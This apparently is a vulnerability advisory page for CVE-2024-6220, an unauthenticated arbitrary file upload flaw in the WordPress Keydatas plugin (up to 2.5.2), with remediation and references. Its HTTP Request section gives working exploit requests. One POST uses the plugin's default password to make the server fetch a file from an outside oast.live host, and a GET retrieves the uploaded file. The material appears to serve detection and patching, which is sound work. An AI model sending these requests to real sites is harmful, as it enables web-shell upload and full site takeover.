---
layout: "post"
cve_id: "CVE-2024-6220"
title: "WordPress Keydatas ‚â§ 2.5.2 - Arbitrary File Upload"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-6220.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6220.yaml"
author: "hnd3884"
severity: "critical"
impact: "Unauthenticated attackers can upload arbitrary files including PHP web shells through the keydatas_downloadImages function, achieving remote code execution and complete site compromise.
"
remediation: "Update Keydatas plugin to version 2.5.3 or later to address the arbitrary file upload vulnerability.
"
reference:
  - "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/keydatas/keydatas-252-unauthenticated-arbitrary-file-upload"
  - "https://github.com/advisories/GHSA-29rm-j4cx-hmc5"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-6220"
classification: "{'cve-id': 'CVE-2024-6220', 'epss-score': 0.7782, 'epss-percentile': 0.98956, 'cwe-id': 'CWE-434', 'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cpe': 'cpe:2.3:a:keydatas:keydatas:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 2, 'vendor': 'keydatas', 'product': 'wordpress'}"
tags:
  - "cve"
  - "cve2024"
  - "wp"
  - "wp-plugin"
  - "wordpress"
  - "keydatas"
  - "file-upload"
  - "rce"
  - "vkev"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
The Keydatas plugin for WordPress (known in Chinese as "ÁÆÄÊï∞ÈááÈõÜÂô®") is vulnerable to unrestricted file uploads due to missing file-type validation in the keydatas_downloadImages function in all versions up to and including 2.5.2. An unauthenticated attacker can upload arbitrary files to the server ‚Äî potentially leading to remote code execution, site takeover, or other severe compromise.


## üåê HTTP Request
```nohighlight
POST /?__kds_flag=post HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Connection: close
Content-Length: 142
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

kds_password=keydatas.com&post_title=1&__kds_docImgs=http://d5iqld1le0o3mm2oevsgkdqwj1zwkbp6a.oast.live/tJrFiETZ&__kds_download_imgs_flag=true
```

```nohighlight
GET /wp-content/uploads/mTWhoR HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

